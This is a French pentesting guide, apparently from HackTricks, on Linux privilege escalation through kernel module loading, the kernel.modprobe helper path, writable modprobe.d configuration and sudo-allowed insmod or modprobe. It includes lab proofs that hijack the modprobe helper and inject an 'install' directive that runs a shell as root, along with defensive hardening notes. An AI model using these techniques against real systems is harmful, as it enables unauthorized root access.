# Abus des modules du kernel et de modprobe

{{#include ../../banners/hacktricks-training.md}}

## Erreurs de configuration des modules du kernel et du chargement des modules

La prise en charge des modules du kernel est un domaine à fort impact lors de l’analyse de l’élévation de privilèges Linux. Ne considérez pas chaque message concernant un module non signé comme exploitable en soi, mais utilisez-le pour répondre à des questions pratiques.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- L’utilisateur actuel peut-il charger des modules via `sudo`, des capabilities ou un chemin d’helper accessible en écriture ?
- Le chargement des modules est-il toujours activé ?
- L’application des signatures des modules est-elle désactivée ?
- Les répertoires de modules, les fichiers de modules ou les chemins de configuration `modprobe.d` sont-ils accessibles en écriture ?<sup>[[16]](#references)</sup>
- Les logs du kernel peuvent-ils être lus pour confirmer ce qui s’est passé ?

Le triage rapide commence par les vérifications suivantes de l’état des modules, des signatures, de la journalisation et de l’arborescence des modules.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interprétation :

- `modules_disabled=1` signifie que les modules ne peuvent être ni chargés ni déchargés, et que la valeur ne peut pas être réinitialisée à `0` avant le redémarrage.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` sur la ligne de commande du kernel ou `CONFIG_MODULE_SIG_FORCE=y` exige des modules correctement signés ; sinon, des modules non signés peuvent être chargés et contaminer le kernel.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` n’impose aucune restriction sur `dmesg` ; lorsqu’il vaut `1`, l’accès nécessite `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Les chemins accessibles en écriture sous `/lib/modules/$(uname -r)/` sont dangereux, car `modprobe` parcourt cette arborescence ainsi que ses données de dépendances lors du chargement des modules.<sup>[[8]](#references)</sup>

### Chargement d’un module et lecture de la sortie du kernel

Si vous disposez d’une autorisation légitime pour charger un module local, `insmod` insère le fichier `.ko` exact que vous fournissez. La fonction d’initialisation du module s’exécute dans le cadre du chargement, et les messages écrits avec `printk()` sont envoyés dans le buffer de journal du kernel, qui est normalement lu avec `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Un workflow minimal de vérification utilise `modinfo` pour inspecter les métadonnées, `insmod` et `rmmod` pour charger et supprimer un module, `lsmod` pour confirmer son état de chargement, et `dmesg` pour inspecter les journaux du kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Si `sudo -l` autorise `insmod`, `modprobe` ou un wrapper autour de ces commandes, considérez cela comme critique : `sudo -l` répertorie les privilèges de l'utilisateur appelant, et le chargement d'un module du kernel nécessite `CAP_SYS_MODULE`. Consultez [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) pour les chemins directs basés sur les capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` autorisé par Sudo

Une règle Sudo qui autorise un utilisateur à exécuter `insmod` n'est pas comparable à l'autorisation d'utiliser un helper administratif normal. Le code d'initialisation du module s'exécute lors de son insertion ; la question pratique de la revue est donc de déterminer si cet utilisateur peut choisir ou modifier le module chargé.<sup>[[3]](#references)</sup>

Le flux de revue générique suivant répète ces vérifications d'inspection, de chargement, d'état, de journalisation et de suppression pour un module candidat.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Si l’utilisateur peut fournir un fichier `.ko` arbitraire, la règle doit être considérée comme une compromission complète du système lors d’une évaluation autorisée. Une approche opérationnelle plus sûre consiste à éviter de déléguer le chargement de modules via sudo ; si cela est inévitable, limitez le chemin exact, la propriété, les permissions, la politique de signature et le workflow de suppression.<sup>[[3]](#references)[[10]](#references)</sup>

Pour un modèle inoffensif de compilation de module dans un lab contrôlé, un code source minimal et un Makefile sont présentés ci-dessous ; la forme `make -C /lib/modules/$(uname -r)/build M=$PWD` suit le workflow kbuild documenté par le kernel pour les modules externes.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Construisez et chargez uniquement dans un laboratoire autorisé ; kbuild construit le module externe, et les commandes de chargement/suppression invoquent les interfaces des modules du kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Vérifications d’abus de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` définit l’assistant userspace que le kernel exécute pour les demandes d’autoload de modules ; ce sysctl affecte l’autoload, et non l’insertion explicite de modules. Si un attacker peut le modifier pour pointer vers le chemin d’un exécutable writable et déclencher une demande de module, cet assistant devient un chemin d’exécution de code privilégié. Le définir sur une chaîne vide désactive les demandes d’autoload ; si `CONFIG_STATIC_USERMODEHELPER=y`, une valeur non vide est remplacée par le chemin de l’assistant statique intégré au kernel.<sup>[[1]](#references)</sup>

Vérifiez le chemin actuel de l’assistant via l’interface sysctl du kernel et examinez la propriété ainsi que le mode de la cible.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Vérifiez si le sysctl, les règles sudo déléguées ou les file capabilities peuvent être influencés.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Le pattern suivant, réservé au lab, modifie le chemin du helper et déclenche une demande documentée d’autoload de module ; utilisez-le uniquement sur un système isolé et autorisé.<sup>[[1]](#references)</sup>

Sur les kernels Linux actuels, n’utilisez pas un exécutable inconnu comme trigger générique : l’autoloading de modules pour les anciens formats binaires personnalisés a été supprimé dans Linux 6.14, tandis que la documentation du kernel identifie un type de filesystem inconnu comme un chemin de demande d’autoload de module.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Sur les systèmes durcis, cette opération devrait échouer lorsque les permissions empêchent les écritures non privilégiées dans `kernel.modprobe`, que le chemin de l’helper n’est pas accessible en écriture ou que le chargement automatique des modules est désactivé.<sup>[[1]](#references)</sup>

### Configuration `modprobe.d` accessible en écriture et `sudo modprobe -C`

Avant de résoudre un module, `modprobe` lit les fichiers `.conf` dans des répertoires de configuration tels que `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` et `/lib/modprobe.d`, selon leur ordre de priorité. Un fichier portant le même nom dans un répertoire de priorité supérieure masque celui du répertoire de priorité inférieure. Plus important encore, une directive `install <module> <command>` exécute une commande shell arbitraire **à la place** de l’insertion de ce module. Par conséquent, un chemin de configuration accessible en écriture peut devenir un mécanisme d’exécution différée de commandes avec les credentials du prochain appelant privilégié de `modprobe` ; l’application de la signature des modules du kernel n’authentifie pas cette commande de l’espace utilisateur.<sup>[[16]](#references)</sup>

Vérifiez les permissions des répertoires et des fichiers, puis inspectez la configuration effective. `modprobe -n -v` est sûr pour examiner la résolution, car le mode dry-run n’insère pas le module et n’exécute aucune commande `install`/`remove`. Préférez `modprobe -c` à l’ancienne syntaxe `--showconfig`, que la documentation actuelle de kmod indique comme devant être supprimée après kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Une règle sudo sans restriction pour `modprobe` est exploitable même lorsque les fichiers `.ko` arbitraires ne peuvent pas passer la vérification de signature : `-C` sélectionne un répertoire de configuration contrôlé par l'attaquant, depuis lequel une commande `install` peut être exécutée par le processus lancé via sudo.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Pour la mitigation, n'accordez pas via sudo un accès à `modprobe` sans restriction sur ses arguments, gardez chaque répertoire de configuration détenu par root et non accessible en écriture, et examinez les directives `install`/`remove` inattendues. Lorsqu'un workflow administratif de confiance doit contourner ces directives pour un module, `modprobe --ignore-install` les ignore pour le module nommé, mais les dépendances peuvent toujours avoir leurs propres commandes.<sup>[[8]](#references)[[16]](#references)</sup>

### Examen de `/lib/modules` accessible en écriture

Les répertoires de modules accessibles en écriture peuvent permettre le remplacement de modules, l'implantation de modules malveillants ou l'exploitation de l'auto-chargement, selon la manière dont `modprobe` est ensuite invoqué ; `modprobe` recherche `/lib/modules/$(uname -r)` et utilise ses données de dépendances lors de la résolution des modules.<sup>[[8]](#references)</sup>

Examinez les fichiers de modules accessibles en écriture ainsi que les métadonnées de dépendances et d'alias sous l'arborescence de modules de la version active du kernel.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Si vous trouvez du contenu de module accessible en écriture, examinez comment `modprobe` résout les dépendances et comment `modinfo` fournit les métadonnées du module.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Notes défensives :

- Conservez `/lib/modules` appartenant à `root:root` et non accessible en écriture aux utilisateurs.<sup>[[8]](#references)</sup>
- Définissez `kernel.modules_disabled=1` après le démarrage lorsque cela est opérationnellement possible.<sup>[[1]](#references)</sup>
- Imposez la signature des modules sur les systèmes nécessitant des modules chargeables.<sup>[[2]](#references)</sup>
- Surveillez les écritures vers `/proc/sys/kernel/modprobe`, `/lib/modules` et les répertoires de configuration `modprobe.d`, ainsi que l'exécution inattendue de `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Documentation de /proc/sys/kernel/ — Documentation du noyau Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Fonctionnalité de signature des modules du noyau — Documentation du noyau Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Page de manuel Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Principes de base des drivers — Documentation du noyau Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Journalisation des messages avec printk — Documentation du noyau Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilation de modules externes — Documentation du noyau Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Page de manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Fusion du tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Page de manuel Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
